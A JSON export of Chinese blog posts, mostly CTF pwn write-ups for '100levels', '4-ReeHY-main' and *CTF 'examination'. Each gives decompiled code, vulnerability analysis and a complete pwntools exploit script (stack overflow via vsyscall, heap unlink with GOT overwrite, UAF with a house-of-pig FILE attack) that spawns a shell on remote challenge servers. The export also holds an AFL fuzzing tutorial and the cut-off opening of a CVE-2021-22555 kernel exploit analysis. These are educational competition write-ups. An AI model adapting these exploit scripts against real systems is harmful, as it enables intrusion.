[{"title":"1000levevls","url":"/2021/12/01/1000levevls/","content":"检查程序\n开启了pie和nx\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  int v3; // eax  __int64 v4; // rdx  __int64 v5; // rcx  init_0();  sub_B69();  while ( 1 )  &#123;    while ( 1 )    &#123;      menu();      v3 = sub_B00();      if ( v3 != 2 )        break;      hint(a1, a2, v4, v5);    &#125;    if ( v3 == 3 )      break;    if ( v3 == 1 )    &#123;      go(a1, a2, v4, v5);    &#125;    else    &#123;      a1 = &quot;Wrong input&quot;;      puts(&quot;Wrong input&quot;);    &#125;  &#125;  sub_D92(a1, a2, v4, v5);  return 0LL;&#125;\n\nint hint()&#123;  char v1[264]; // [rsp+8h] [rbp-108h] BYREF  if ( unk_20208C )    sprintf(v1, &quot;Hint: %p\\n&quot;, &amp;system);  else    strcpy(v1, &quot;NO PWN NO FUN&quot;);  return puts(v1);&#125;\n\nint go()&#123;  __int64 v1; // [rsp+0h] [rbp-120h]  int v2; // [rsp+8h] [rbp-118h]  int v3; // [rsp+Ch] [rbp-114h]  __int64 v4; // [rsp+10h] [rbp-110h]  __int64 v5; // [rsp+10h] [rbp-110h]  __int64 v6; // [rsp+18h] [rbp-108h]  char v7[256]; // [rsp+20h] [rbp-100h] BYREF  puts(&quot;How many levels?&quot;);  v1 = sub_B00();  if ( v1 &gt; 0 )    v4 = v1;  else    puts(&quot;Coward&quot;);  puts(&quot;Any more?&quot;);  v5 = v4 + sub_B00();  if ( v5 &gt; 0 )  &#123;    if ( v5 &lt;= 99 )    &#123;      v6 = v5;    &#125;    else    &#123;      puts(&quot;You are being a real man.&quot;);      v6 = 100LL;    &#125;    puts(&quot;Let&#x27;s go!&#x27;&quot;);    v2 = time(0LL);    if ( sub_E43(v6) )    &#123;      v3 = time(0LL);      sprintf(v7, &quot;Great job! You finished %d levels in %d seconds\\n&quot;, v6, (v3 - v2));      puts(v7);    &#125;    else    &#123;      puts(&quot;You failed.&quot;);    &#125;    exit(0);  &#125;  return puts(&quot;Coward Coward Coward Coward Coward&quot;);&#125;\n\n_BOOL8 __fastcall sub_E43(signed int a1)&#123;  __int64 v2; // rax  __int64 buf[4]; // [rsp+10h] [rbp-30h] BYREF  unsigned int v4; // [rsp+34h] [rbp-Ch]  unsigned int v5; // [rsp+38h] [rbp-8h]  unsigned int v6; // [rsp+3Ch] [rbp-4h]  buf[0] = 0LL;  buf[1] = 0LL;  buf[2] = 0LL;  buf[3] = 0LL;  if ( !a1 )    return 1LL;  if ( !sub_E43((a1 - 1)) )    return 0LL;  v6 = rand() % a1;  v5 = rand() % a1;  v4 = v5 * v6;  puts(&quot;====================================================&quot;);  printf(&quot;Level %d\\n&quot;, a1);  printf(&quot;Question: %d * %d = ? Answer:&quot;, v6, v5);  read(0, buf, 0x400uLL);  v2 = strtol(buf, 0LL, 10);  return v2 == v4;&#125;\n\n流程分析可以看到E43存在栈溢出但是因为开启了PIE保护所以我们也不知道要ret什么玩意\nvsyscall现代的Windows/*Unix操作系统都采用了分级保护的方式，内核代码位于R0，用户代码位于R3。许多对硬件和内核等的操作都会被包装成内核函数并提供一个接口给用户层代码调用，这个接口就是我们熟知的int 0x80/syscall+调用号模式。当我们每次调用这个接口时，为了保证数据的隔离，我们需要把当前的上下文(寄存器状态等)保存好，然后切换到内核态运行内核函数，然后将内核函数返回的结果放置到对应的寄存器和内存中，再恢复上下文，切换到用户模式。这一过程需要耗费一定的性能。对于某些系统调用，如gettimeofday来说，由于他们经常被调用，如果每次被调用都要这么来回折腾一遍，开销就会变成一个累赘。因此系统把几个常用的无参内核调用从内核中映射到用户空间中，这就是vsyscall\nvsyscall的固定地址是0xffffffffff600000–0xffffffffff601000即便是在PIE开启的情况下都是不变的，所以可以用来充当ret的作用\n利用分析其实在上面思路就断了，看了wp发现这道题需要看一看汇编代码，先看hint的代码\n.text:0000000000000D06 ; __unwind &#123;.text:0000000000000D06                 push    rbp.text:0000000000000D07                 mov     rbp, rsp.text:0000000000000D0A                 sub     rsp, 110h.text:0000000000000D11                 mov     rax, cs:system_ptr.text:0000000000000D18                 mov     [rbp+var_110], rax.text:0000000000000D1F                 lea     rax, unk_20208C.text:0000000000000D26                 mov     eax, [rax].text:0000000000000D28                 test    eax, eax.text:0000000000000D2A                 jz      short loc_D57.text:0000000000000D2C                 mov     rax, [rbp+var_110].text:0000000000000D33                 lea     rdx, [rbp+var_110].text:0000000000000D3A                 lea     rcx, [rdx+8].text:0000000000000D3E                 mov     rdx, rax.text:0000000000000D41                 lea     rsi, aHintP     ; &quot;Hint: %p\\n&quot;.text:0000000000000D48                 mov     rdi, rcx        ; s.text:0000000000000D4B                 mov     eax, 0.text:0000000000000D50                 call    _sprintf.text:0000000000000D55                 jmp     short loc_D7C.text:0000000000000D57 ; ---------------------------------------------------------------------------.text:0000000000000D57.text:0000000000000D57 loc_D57:                                ; CODE XREF: hint+24↑j.text:0000000000000D57                 lea     rax, [rbp+var_110].text:0000000000000D5E                 add     rax, 8.text:0000000000000D62                 mov     rsi, 4E204E5750204F4Eh.text:0000000000000D6C                 mov     [rax], rsi.text:0000000000000D6F                 mov     dword ptr [rax+8], 5546204Fh.text:0000000000000D76                 mov     word ptr [rax+0Ch], 4Eh ; &#x27;N&#x27;.text:0000000000000D7C.text:0000000000000D7C loc_D7C:                                ; CODE XREF: hint+4F↑j.text:0000000000000D7C                 lea     rax, [rbp+var_110].text:0000000000000D83                 add     rax, 8.text:0000000000000D87                 mov     rdi, rax        ; s.text:0000000000000D8A                 call    _puts.text:0000000000000D8F                 nop.text:0000000000000D90                 leave.text:0000000000000D91                 retn\n\n虽然hint在反汇编里面看起来是先比较unk_20208C这个地址的值，但是看汇编代码可以看到，他是先将system_addr放到[rbp+var_110]的位置\n在go函数里面也有一个很关键的代码\nv1 = sub_B00();if ( v1 &gt; 0 )\tv4 = v1;else    puts(&quot;Coward&quot;);\n\n关键就关键在v4就是rbp+var_110的位置，继续看汇编代码\n.text:0000000000000B94 ; __unwind &#123;.text:0000000000000B94                 push    rbp.text:0000000000000B95                 mov     rbp, rsp.text:0000000000000B98                 sub     rsp, 120h.text:0000000000000B9F                 lea     rdi, aHowManyLevels ; &quot;How many levels?&quot;.text:0000000000000BA6                 call    _puts.text:0000000000000BAB                 call    sub_B00.text:0000000000000BB0                 mov     [rbp+var_120], rax.text:0000000000000BB7                 mov     rax, [rbp+var_120].text:0000000000000BBE                 test    rax, rax.text:0000000000000BC1                 jg      short loc_BD1.text:0000000000000BC3                 lea     rdi, aCoward    ; &quot;Coward&quot;.text:0000000000000BCA                 call    _puts.text:0000000000000BCF                 jmp     short loc_BDF.text:0000000000000BD1 ; ---------------------------------------------------------------------------.text:0000000000000BD1.text:0000000000000BD1 loc_BD1:                                ; CODE XREF: go+2D↑j.text:0000000000000BD1                 mov     rax, [rbp+var_120].text:0000000000000BD8                 mov     [rbp+var_110], rax.text:0000000000000BDF.text:0000000000000BDF loc_BDF:                                ; CODE XREF: go+3B↑j.text:0000000000000BDF                 lea     rdi, aAnyMore   ; &quot;Any more?&quot;.text:0000000000000BE6                 call    _puts.text:0000000000000BEB                 call    sub_B00.text:0000000000000BF0                 mov     [rbp+var_120], rax.text:0000000000000BF7                 mov     rdx, [rbp+var_110].text:0000000000000BFE                 mov     rax, [rbp+var_120].text:0000000000000C05                 add     rax, rdx.text:0000000000000C08                 mov     [rbp+var_110], rax.text:0000000000000C0F                 mov     rax, [rbp+var_110].text:0000000000000C16                 test    rax, rax.text:0000000000000C19                 jg      short loc_C2C.text:0000000000000C1B                 lea     rdi, aCowardCowardCo ; &quot;Coward Coward Coward Coward Coward&quot;.text:0000000000000C22                 call    _puts.text:0000000000000C27                 jmp     locret_D04\n\n可以看到如果我们输入的v5&lt;0的话就会跳转到loc_BDF位置这个时候我们的[rbp+var_110]就变成可控的了。\n为什么可以这么利用可以看到hint和go都是在main下被调用，所以他们的rbp都是一样的\n接着看栈溢出的函数的汇编代码，主要关注它栈的情况\n.text:0000000000000E43 ; __unwind &#123;.text:0000000000000E43                 push    rbp.text:0000000000000E44                 mov     rbp, rsp.text:0000000000000E47                 sub     rsp, 40h.text:0000000000000E4B                 mov     [rbp+var_34], edi.text:0000000000000E4E                 mov     [rbp+buf], 0.text:0000000000000E56                 mov     [rbp+var_28], 0.text:0000000000000E5E                 mov     [rbp+var_20], 0.text:0000000000000E66                 mov     [rbp+var_18], 0.text:0000000000000E6E                 cmp     [rbp+var_34], 0.text:0000000000000E72                 jnz     short loc_E7E.text:0000000000000E74                 mov     eax, 1.text:0000000000000E79                 jmp     locret_F45\n\n可以看到他就是将rbp换到rsp上然后再减去0x40，那么此时我们栈这块的内存情况就是\n\nsystem地址就在rbp下面的第四个位置，在就是我们只要ret三次就可一到system函数\n这就用到了vsyscall的固定地址是0xffffffffff600000即便是在PIE开启的情况下都是不变的，所以可以用来充当ret的作用\n但是我们就算是ret到了system也没啥用因为我没法控制rdi，题目又给了libc所以很容易想到one_gadget\n\n又因为我们再上面说的这个存放system的地方因为add指令是可以控制的，所以利用思路就是计算one_gadget与system的差值(即便是开启了PIE，他们之间的差值不变)然后利用add指令把system的地址换到one_gadget\nexpfrom pwn import *elf = ELF(&#x27;./100levels&#x27;)libc = ELF(&#x27;./libc.so&#x27;)# r = process(&#x27;./100levels&#x27;)r = remote(&#x27;111.200.241.244&#x27;, 51622)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]one_gadget = 0x4526asystem_addr = libc.symbols[&#x27;system&#x27;]vsyscall_addr = 0xffffffffff600000r.recvuntil(b&#x27;Choice:\\n&#x27;)r.sendline(b&#x27;2&#x27;)r.recvuntil(b&#x27;Choice:\\n&#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;How many levels?\\n&#x27;)r.sendline(b&#x27;0&#x27;)r.recvuntil(b&#x27;Any more?\\n&#x27;)r.sendline(bytes(str(one_gadget-system_addr), encoding=&#x27;utf8&#x27;))for i in range(99):    r.recvuntil(b&quot;\\nQuestion: &quot;)    question = r.recvuntil(b&#x27; = ? Answer:&#x27;, drop=True)    print(question)    res = eval(question)    r.sendline(bytes(str(res), encoding=&#x27;utf8&#x27;))payload = b&#x27;a&#x27;*(0x30+0x8)+p64(vsyscall_addr)*3r.recvuntil(b&#x27; = ? Answer:&#x27;)r.send(payload)r.interactive()\n","categories":["pwn-xctf"],"tags":["栈溢出","vsyscall"]},{"title":"4-ReeHY-main","url":"/2021/12/03/4-ReeHY-main/","content":"保护检查\n就开了个NX\nvoid __fastcall main(__int64 a1, char **a2, char **a3)&#123;  sub_400856(a1, a2, a3);  while ( 1 )  &#123;    menu();    switch ( sub_400C55() )    &#123;      case 1u:        create();        break;      case 2u:        delete();        break;      case 3u:        edit();        break;      case 4u:        show();        break;      case 5u:        puts(&quot;bye~bye~ young hacker&quot;);        exit(0);      default:        puts(&quot;Invalid Choice!&quot;);        break;    &#125;  &#125;&#125;\n\nint sub_400856()&#123;  void *buf; // [rsp+8h] [rbp-8h]  setvbuf(stdout, 0LL, 2, 0LL);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stderr, 0LL, 2, 0LL);  chunk_size = malloc(0x14uLL);  puts(&quot;Input your name: &quot;);  write(1, &quot;$ &quot;, 2uLL);  buf = malloc(0x20uLL);  read(0, buf, 0x20uLL);  write(1, &quot;Hello &quot;, 6uLL);  return puts(buf);&#125;\n\nint create()&#123;  int result; // eax  char buf[128]; // [rsp+0h] [rbp-90h] BYREF  void *dest; // [rsp+80h] [rbp-10h]  int v3; // [rsp+88h] [rbp-8h]  size_t nbytes; // [rsp+8Ch] [rbp-4h]  result = chunk_id;  if ( chunk_id &lt;= 4 )  &#123;    puts(&quot;Input size&quot;);    result = sub_400C55();    LODWORD(nbytes) = result;    if ( result &lt;= 4096 )    &#123;      puts(&quot;Input cun&quot;);      result = sub_400C55();      v3 = result;      if ( result &lt;= 4 )      &#123;        dest = malloc(nbytes);        puts(&quot;Input content&quot;);        if ( nbytes &gt; 112 )        &#123;          read(0, dest, nbytes);        &#125;        else        &#123;          read(0, buf, nbytes);          memcpy(dest, buf, nbytes);        &#125;        *(chunk_size + 4LL * v3) = nbytes;        *(&amp;chunk + 2 * v3) = dest;        dword_6020E8[4 * v3] = 1;        ++chunk_id;        result = fflush(stdout);      &#125;    &#125;  &#125;  return result;&#125;\n\n__int64 delete()&#123;  __int64 result; // rax  int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Chose one to dele&quot;);  result = sub_400C55();  v1 = result;  if ( result &lt;= 4 )  &#123;    free(*(&amp;chunk + 2 * result));    dword_6020E8[4 * v1] = 0;    puts(&quot;dele success!&quot;);    result = --chunk_id;  &#125;  return result;&#125;\n\nint edit()&#123;  int result; // eax  int v1; // [rsp+Ch] [rbp-4h]  puts(&quot;Chose one to edit&quot;);  result = sub_400C55();  v1 = result;  if ( result &lt;= 4 )  &#123;    result = dword_6020E8[4 * result];    if ( result == 1 )    &#123;      puts(&quot;Input the content&quot;);      read(0, *(&amp;chunk + 2 * v1), *(4LL * v1 + chunk_size));      result = puts(&quot;Edit success!&quot;);    &#125;  &#125;  return result;&#125;\n\nshow是不输出东西的\n流程分析sub_400856函数:创建一个堆块用来存放其他堆块的大小\ncreate函数:创建一个堆块放在*(&amp;chunk + 2 * v3)里面，不存在堆溢出\ndelete函数:将一个堆块free掉，没有清除指针，但是用于存放堆块是否处于use状态的指变为了0\nedit函数:根据前面在chunk_size这个堆块里面的值来确定写入的大小，看似也没有堆溢出\n漏洞点delete函数在free的时候是没有检验选择的chunk是否越界，所以我们可以free掉储存chunk大小的堆块然后再create的时候修改其内部的值，就可以造成堆溢出，又因为没有开启PIE保护，理所应当想到unlink漏洞。后面就是需要泄漏地址计算便宜量，其实很好理解，我直接把exp贴出来配合payload很好理解的\nexp:\nfrom pwn import *from LibcSearcher import *elf = ELF(&#x27;./4-ReeHY-main&#x27;)libc = ELF(&#x27;./ctflibc.so.6&#x27;)# r = process(&#x27;./4-ReeHY-main&#x27;, env=&#123;&quot;LD_PRELOAD&quot;: &quot;ctflibc.so.6&quot;&#125;)r = remote(&#x27;111.200.241.244&#x27;, 52152)context.log_level = &#x27;debug&#x27;chunk_arr = 0x6020E0free_got = elf.got[&#x27;free&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]atoi_got = elf.got[&#x27;atoi&#x27;]def create(size, id, content):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;Input size\\n&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input cun\\n&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input content\\n&#x27;)    r.send(content)def delete(id):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;Chose one to dele&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def edit(id, content):    r.recvuntil(b&#x27;$ &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;Chose one to edit\\n&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;Input the content\\n&#x27;)    r.send(content)r.recvuntil(b&#x27;$ &#x27;)r.sendline(b&#x27;196082&#x27;)create(0x100, 0, b&#x27;a&#x27;*0x100)create(0x100, 1, b&#x27;b&#x27;*0x100)# gdb.attach(r)# pause()delete(-2)# gdb.attach(r)payload = p32(0x200)+p32(0x100)create(0x14, 2, payload)payload = p64(0)+p64(0x101)+p64(chunk_arr-0x8*3) + \\    p64(chunk_arr-0x8*2)+b&#x27;a&#x27;*(0x100-0x8*4)+p64(0x100)+p64(0x110)edit(0, payload)delete(1)payload = p64(0)*3+p64(free_got)+p64(1) + \\    p64(atoi_got)+p64(1)+p64(atoi_got)+p64(1)edit(0, payload)edit(0, p64(puts_plt))delete(1)atoi_addr = u64(r.recvuntil(b&#x27;\\ndele success!&#x27;, drop=True)                [1:].ljust(8, b&#x27;\\x00&#x27;))print(hex(atoi_addr))libc = LibcSearcher(&#x27;atoi&#x27;, atoi_addr)offset = atoi_addr-libc.dump(&#x27;atoi&#x27;)system_addr = offset+libc.dump(&#x27;system&#x27;)edit(2, p64(system_addr))r.recvuntil(b&#x27;$ &#x27;)r.sendline(b&#x27;/bin/sh\\x00&#x27;)r.interactive()\n\n","categories":["pwn-xctf"],"tags":["unlink"]},{"title":"FUZZ(2):AFL结果分析和代码覆盖率","url":"/2023/03/23/AFL%E7%BB%93%E6%9E%9C%E5%88%86%E6%9E%90%E5%92%8C%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/","content":"本来不打算做AFL的源码分析，但是看到了一篇文章吸引到了我，当然这篇文章还是不会涉及到源码分析，在后续的FUZZ相关文章中会进行进一步分析。\nfuzzer工作状态首先可以查看在output目录下的fuzzer_state文件：\n➜  afl-2.52b cat ./afl_test/output_dir/fuzzer_statsstart_time        : 1679542022last_update       : 1679542022fuzzer_pid        : 541718cycles_done       : 0execs_done        : 24execs_per_sec     : 387.10paths_total       : 3paths_favored     : 2paths_found       : 0paths_imported    : 0max_depth         : 1cur_path          : 0pending_favs      : 2pending_total     : 3variable_paths    : 0stability         : 100.00%bitmap_cvg        : 0.05%unique_crashes    : 0unique_hangs      : 0last_path         : 0last_crash        : 0last_hang         : 0execs_since_crash : 24exec_timeout      : 20afl_banner        : testafl_version       : 2.52btarget_mode       : qemu command_line      : ./afl-fuzz -i ./afl_test/input_dir -o ./afl_test/output_dir -Q ./afl_test/test\n\n不过这里我在运行时cat几次内容都没有发生变化所以我猜测应该是运行开始时产生，运行结束时才修改内容。那么如果想要实时的查看运行情况的话可以用afl-whatsup。\n➜  afl-2.52b ./afl-whatsup ./afl_teststatus check tool for afl-fuzz by &lt;lcamtuf@google.com&gt;Individual fuzzers==================&gt;&gt;&gt; test (0 days, 0 hrs) &lt;&lt;&lt;  cycle 1, lifetime speed 2 execs/sec, path 0/3 (0%)  pending 2/3, coverage 0.05%, no crashes yetSummary stats=============       Fuzzers alive : 1      Total run time : 0 days, 0 hours         Total execs : 0 million    Cumulative speed : 2 execs/sec       Pending paths : 2 faves, 3 total       Crashes found : 0 locally unique➜  afl-2.52b ./afl-whatsup ./afl_teststatus check tool for afl-fuzz by &lt;lcamtuf@google.com&gt;Individual fuzzers==================&gt;&gt;&gt; test (0 days, 0 hrs) &lt;&lt;&lt;  cycle 96, lifetime speed 1480 execs/sec, path 3/4 (75%)  pending 0/0, coverage 0.05%, crash count 3 (!)Summary stats=============       Fuzzers alive : 1      Total run time : 0 days, 0 hours         Total execs : 0 million    Cumulative speed : 1480 execs/sec       Pending paths : 0 faves, 0 total       Crashes found : 3 locally unique\n\n虽然但是，我感觉我这里好像使用有问题，但是先不管那么多了。\n再简单介绍一下afl-plot，这个工具总结出来的内容更为直观，可以直接图形化显示。这里存在一定依赖问题\napt-get install gnuplotafl-plot afl_state_dir graph_output_dir\n\n下面就是输出出来的结果，但是不知道为什么这里的total paths没有显示，我猜测可能是因为这里不是使用afl-gcc进行编译或者就是我的电脑性能太拉了。这里的uniq crashes开始在增加随后逐渐趋于平稳。最后一个就是执行速度，随着时间的推移也是越来越慢了，当然也可能是因为占用了太多的系统资源。\n然后再说说pythia插件吧，这个插件可以看到发现新的crash和path的概率。他与原版也只是差了几个字段。\n\n这里在process timing里面框中出现了两个新的字段分别是correctiness和fuzzability，他们的含义分别是在没有发现crash时，发现一个导致crash输入的概率，表示在该程序中发现新路径的难度，该数值越高代表程序越容易Fuzz。在overall results框中也多了两个，第一个是当前发现的路径，一个是路径覆盖率。\n何时关闭fuzz用过就能知道的是fuzz其实是无限执行下去的，这里可以用上面的几种方法来观察是否该结束，当然这里也可以直接在原始的AFL中看到何时该结束，注意这里cycles done的颜色，在fuzz的过程中这个颜色是一直会变化的，可以看到上面的图中颜色为紫色，这里为蓝色。所以他的变化顺序为紫色-&gt;黄色-&gt;蓝色-&gt;绿色，当为绿色是就代表很难再找到新的crash了，而这个时候就可以结束了。(下图为蓝色主要是受我电脑性能影响的)\n➜  output_dir tree.├── crashes│   ├── id:000000,sig:06,src:000001,op:havoc,rep:64│   ├── id:000001,sig:11,src:000000,op:flip1,pos:1│   ├── id:000002,sig:11,src:000000,op:havoc,rep:16│   └── README.txt├── fuzz_bitmap├── fuzzer_stats├── hangs├── plot_data└── queue    ├── id:000000,orig:in.txt    ├── id:000001,orig:in1.txt    ├── id:000002,orig:in2.txt    └── id:000003,src:000001,op:arith8,pos:0,val:-27,+cov\n\nqueue：存放所有具有独特执行路径的测试用例。crashes：导致目标接收致命signal而崩溃的独特测试用例。crashes/README.txt：保存了目标执行这些crash文件的命令行参数。hangs：导致目标超时的独特测试用例。fuzzer_stats：afl-fuzz的运行状态。plot_data：用于afl-plot绘图。\n处理测试结果这里只介绍两种方式，一是crashwalk再就是afl-collect\ncrashwalk安装过程这里就不再说了，网上很多，搜搜就有。\n首先这个有两种模式，一是Manual Mode其次就是AFL Mode，他们的命令新式分别如下。\n~/tools/go/bin/cwtriage -root syncdir/fuzzer1/crashes/ -match id -- ~/parse @@~/tools/go/bin/cwtriage -root syncdir -afl\n\n\n这里使用的是第一种方式(用AFL时我这里会出现无法no crash detected错误)。\n可以看到这里的描述中写上了栈溢出漏洞。\nafl-collect这个工具使用命令如下：\npython3 ./afl-collect -j 8 -d crashes.db -e gdb_script ./afl_sync_dir ./collection_dir --  /path/to/target --target-opts\n\n\n结果比上面的更为直观。\n代码覆盖率代码覆盖率是模糊测试中一个极其重要的概念，使用代码覆盖率可以评估和改进测试过程，执行到的代码越多，找到bug的可能性就越大，毕竟，在覆盖的代码中并不能100%发现bug，在未覆盖的代码中却是100%找不到任何bug的，所以本节中就将详细介绍代码覆盖率的相关概念。\n代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。其计量方式很多，但无论是GCC的GCOV还是LLVM的SanitizerCoverage，都提供函数（function）、基本块（basic-block）、边界（edge）三种级别的覆盖率检测，更具体的细节可以参考LLVM的官方文档。\n基本块\n只有一个入口点，BB中的指令不是任何跳转指令的目标。\n只有一个退出点，只有最后一条指令使执行流程转移到另一个BB\n\n如下图中的代码就可以被切割为4个基本块，平时我们在IDA图形模式中看到的就是一个一个的基本块\n拿一个程序举例，在ida中每一块就代表一个基本块。\n\n边依旧是上面ida的图，每一条线，也就是每一个箭头就代表一个边。\n元组在AFL中，使用二元组(branch_src, branch_dst)来记录当前基本块 + 前一基本块的信息，从而获取目标的执行流程和代码覆盖情况，伪代码如下：\ncur_location = &lt;COMPILE_TIME_RANDOM&gt;;            //用一个随机数标记当前基本块shared_mem[cur_location ^ prev_location]++;        //将当前块和前一块异或保存到shared_mem[]prev_location = cur_location &gt;&gt; 1;                //cur_location右移1位区分从当前块到当前块的转跳\n\n实际插入的汇编代码，如下图所示，首先保存各种寄存器的值并设置rcx，然后调用__afl_maybe_log，这个方法的内容相当复杂，这里就不展开讲了，但其主要功能就和上面的伪代码相似，用于记录覆盖率，放入一块共享内存中。\n计算代码覆盖率这里计算代码覆盖率主要是介绍两个工具，一是GCOV另一个则是LCOV它是GCOV的前端。\n\n可以看到这里有覆盖率之类的东西，当然也可以在网页中打开\n\n\n点开文件会有更为详细的数据，每行代码前的数字代表被执行的次数，其中红色的代表未执行过的。\n\n参考链接:    https://paper.seebug.org/842/#4-afl-collect\n","categories":["FUZZ"],"tags":["AFL","FUZZ"]},{"title":"*CTF-examination","url":"/2022/04/17/CTF-examination/","content":"examination太菜了只做了第一道题，第二道题死活找不到漏洞点\n流程分析这道题的流程挺明确的，因为是c语言逆向起来比较简单这里就不再赘述逆向过程了。\n总的来说程序就是下图所示的这个结构\n\n首先就是程序存在一个可以让我们任意地址+1的函数，利用此函数造成UAF，进而泄漏出libc地址，随后继续利用UAF控制结构体的指向，进而控制tcache_struct最后使用house of pig的最后一步即可。\nexpfrom pwn import *elf = ELF(&#x27;./examination&#x27;)# r = process(&#x27;./examination&#x27;)r = remote(&#x27;124.70.130.92&#x27;, 60001)libc = ELF(&#x27;./libc-2.31.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;def menu(choice):    r.sendlineafter(b&#x27;choice&gt;&gt; &#x27;, bytes(str(choice), encoding=&#x27;utf-8&#x27;))def create(question_num):    menu(1)    r.recvuntil(b&#x27;enter the number of questions: &#x27;)    r.sendline(bytes(str(question_num), encoding=&#x27;utf8&#x27;))def score():    menu(2)def write_review(idx, comment, size=None):    menu(3)    r.sendlineafter(b&#x27;which one? &gt; &#x27;, bytes(str(idx), encoding=&#x27;utf-8&#x27;))    if size is not None:        r.recvuntil(b&#x27;please input the size of comment: &#x27;)        r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.sendafter(b&#x27;enter your comment:&#x27;, comment)def delete(idx):    menu(4)    r.recvuntil(b&#x27;which student id to choose?&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def change_role(role):    menu(5)    r.recvuntil(b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;)    r.sendline(bytes(str(role), encoding=&#x27;utf-8&#x27;))def check_review(addr=None):    menu(2)    if addr is not None:        r.recvuntil(b&#x27;add 1 to wherever you want! addr: &#x27;)        r.sendline(bytes(str(addr), encoding=&#x27;utf-8&#x27;))def xor_pray():    menu(3)def set_mod(score, mod=None):    menu(4)    if mod is not None:        r.recvuntil(b&#x27;enter your mode!&#x27;)        r.send(mod)    else:        r.recvuntil(b&#x27;enter your pray score: 0 to 100&#x27;)        r.sendline(bytes(str(score), encoding=&#x27;utf-8&#x27;))def change_id(idx):    menu(6)    r.recvuntil(b&#x27;input your id: &#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf-8&#x27;))def gift(content):    menu(6)    r.recvuntil(b&#x27;never pray again!&#x27;)    r.send(content)r.recvuntil(b&#x27;role: &lt;0.teacher/1.student&gt;:&#x27;)r.sendline(b&#x27;0&#x27;)create(9)create(1)change_role(1)change_id(1)xor_pray()change_role(0)score()write_review(1, b&#x27;dzhsb&#x27;, 0x350)write_review(0, b&#x27;a&#x27; * 240 + flat(0x460, 0x261), 0x350)change_role(1)change_id(1)check_review()r.recvuntil(b&#x27;Good Job! Here is your reward! &#x27;)chunk_base = int(r.recvuntil(b&#x27;\\n&#x27;, drop=True), base=16) - 0x2f0print(hex(chunk_base))r.recvuntil(b&#x27;add 1 to wherever you want! addr: &#x27;)r.send(bytes(str(chunk_base + 0x339), encoding=&#x27;utf-8&#x27;))change_role(0)delete(1)create(1)write_review(1, b&#x27;wow&#x27;, 800 - 0x20)change_role(1)change_id(0)check_review()r.recvuntil(b&#x27;here is the review:\\n&#x27;)main_arena_96 = u64(r.recv(8))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]change_role(0)create(9)write_review(    0, flat(chunk_base + 0x6d0, 0, 0, 0, 0, 0x21, 0x1, chunk_base + 0x10,            0x290))write_review(    2,    b&#x27;7&#x27; * 0xc0 + p64(libc.symbols[&#x27;__free_hook&#x27;] + libc_base - 0x10) + b&#x27;7&#x27; *    (0x200 - 8 * 2 - 0xc0) + p64(libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;]))def pack_file(_IO_write_base=0,              _IO_write_ptr=0,              _IO_buf_base=0,              _IO_buf_end=0,              vtable=0):    IO_FILE = p64(0)*3+p64(0) + \\        p64(_IO_write_base)+p64(_IO_write_ptr) + \\        p64(0)+p64(_IO_buf_base)+p64(_IO_buf_end)    IO_FILE = IO_FILE.ljust(0xc0, b&#x27;\\x00&#x27;)    IO_FILE += p32(0)    IO_FILE = IO_FILE.ljust(0xd8, b&#x27;\\x00&#x27;) + p64(vtable)    return IO_FILE_IO_str_jumps = libc_base + 0x1e9560print(hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))file_struct = pack_file(    1, 0xffffffffffff, libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;] + 0xe0,    libc_base + libc.symbols[&#x27;_IO_2_1_stderr_&#x27;] + 0xe0 + 0x18, _IO_str_jumps)file_struct += b&#x27;/bin/sh\\x00&#x27; + p64(system_addr) * 2gift(file_struct + b&#x27;\\n&#x27;)# gdb.attach(r)r.interactive()\n\nhouse of pig源码层面分析\n","categories":["比赛wp"],"tags":["house of pig","HeapFengShui"]},{"title":"CVE-2021-22555利用方法分析","url":"/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/","content":"前言在上一篇文章d3kheap中提到还有另外一种解决办法就是利用这一CVE进行利用，所以这一篇依旧使用d3kheap来进行复现。不过这里首先提一下这个CVE原本的漏洞。\n在原本的CVE中漏洞点是net/netfilter/x_tables.c 中 Netfilter 模块的ip_tables子模块， 当调用setsockopt()和选项IPT_SO_SET_REPLACE（或 IP6T_SO_SET_REPLACE）时，内核结构需要从32位转换为64位，由于错误计算转换大小，导致在调用 xt_compat_match_from_user() 函数时堆溢出写 